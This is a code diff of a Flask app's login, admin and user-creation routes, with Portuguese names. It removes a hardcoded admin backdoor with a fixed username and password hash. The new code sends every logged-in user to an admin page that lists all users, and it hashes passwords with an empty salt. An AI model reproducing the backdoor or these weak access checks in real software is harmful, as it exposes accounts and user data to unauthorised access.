@@ -38,16 +38,12 @@ def login():
         senha = form.senha.data
         senhaHash = Criptografador.gerar_hash(senha, '')
 
-        # Backdoor do administrador
-        if form.login.data == "jailson_admin" and senhaHash == "110d46fcd978c24f306cd7fa23464d73":
-            return redirect(url_for('admin_home'))
-
         ans = db.verifica_login(login=form.login.data, senha=senhaHash)
         if ans:
             if (not db.verifica_logado(login=form.login.data)):
                 db.set_logado_true(login=form.login.data)
-                return redirect(url_for('cadastrar'))
-            flash("Usuario já logado!")
+                return redirect(url_for('admin_home'))
+            return redirect(url_for('admin_home'))
 
 
 
@@ -68,12 +64,13 @@ def logout():
     return redirect(url_for('index'))
 
 
-@app.route('/admin')
+@app.route('/admin_home')
 def admin_home():
     form = CadastraUsuarioForm()
+    usuarios = db.get_usuarios()
     if(session['user_login'] == ""):
         return redirect(url_for('index'))
-    return render_template('admin_home.html')
+    return render_template('admin_home.html', usuarios=usuarios)
 
 
 @app.route('/usuario')
@@ -89,13 +86,15 @@ def usuario_criar():
     form = CadastraUsuarioForm()
     if form.validate_on_submit():
         usuario = Usuario(
+    nome=form.usuario_nome.data,
     login=form.usuario_login.data,
     senha=Criptografador.gerar_hash(
         form.usuario_senha.data,
         ''))
 
         db.cadastra_usuario(usuario)
-        return redirect(url_for('usuario_listar'))
+
+        return redirect(url_for('admin_home'))
     else:
         flash_errors(form)
         return render_template('usuario_criar.html', form=form)
